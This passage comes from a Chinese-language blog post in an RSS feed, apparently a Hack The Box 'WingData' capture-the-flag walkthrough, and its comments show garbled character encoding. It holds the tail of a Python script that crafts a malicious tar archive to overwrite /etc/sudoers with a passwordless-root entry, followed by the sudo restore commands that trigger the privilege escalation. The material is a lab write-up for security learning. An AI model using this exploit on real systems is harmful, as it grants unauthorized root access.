            # 6. åå¥æ¶æåå®¹å°sudoers_linkï¼è¦ç/etc/sudoersï¼
            malicious_content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
            file_info = tarfile.TarInfo("sudoers_link")
            file_info.type = tarfile.REGTYPE  # æ è®°ä¸ºæ®éæä»¶ç±»å
            file_info.size = len(malicious_content)  # æå®æä»¶å¤§å°
            # å°åå®¹åå¥taræä»¶
            tar.addfile(file_info, fileobj=io.BytesIO(malicious_content))

        print(f"[+] æ¶ætaræä»¶å·²çæï¼{output_path}")
    except Exception as e:
        print(f"[!] çætaræä»¶å¤±è´¥ï¼{str(e)}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    # æ¯æèªå®ä¹è¾åºè·¯å¾ï¼å¯éåæ°ï¼
    if len(sys.argv) &gt; 1:
        output_tar = sys.argv[1]
    else:
        output_tar = "/tmp/backup_9999.tar"
    
    create_malicious_tar(output_tar)
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446994-1384173239.png" alt="image-20260219194852389" loading="lazy"></p>
<p>å¤å¶è¿ä¸ªæ¶æçtaræä»¶å°sudoæéçç®å½ä¸</p>
<pre><code class="language-kotlin">cp backup_9999.tar /opt/backup_clients/backups/
</code></pre>
<p>ç¶åè¿è¡è¿ä¸ªsudoèæ¬</p>
<pre><code class="language-kotlin">sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447328-614892323.png" alt="image-20260219195503275" loading="lazy"></p>
<p>è¿æ¶ååå»sudo</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447643-1483399691.png" alt="image-20260219200000270" loading="lazy"></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.13472222222222222" data-date-updated="2026-02-19 23:19">2026-02-19 20:05</span>&nbsp;
<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
éè¯»(<span id="post_view_count">174</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19625276);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19625276', targetLink: 'https://www.cnblogs.com/DSchenzi/p/19625276', title: 'ãæ¸éæµè¯ãHTB Season10 WingData å¨è¿ç¨wp' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>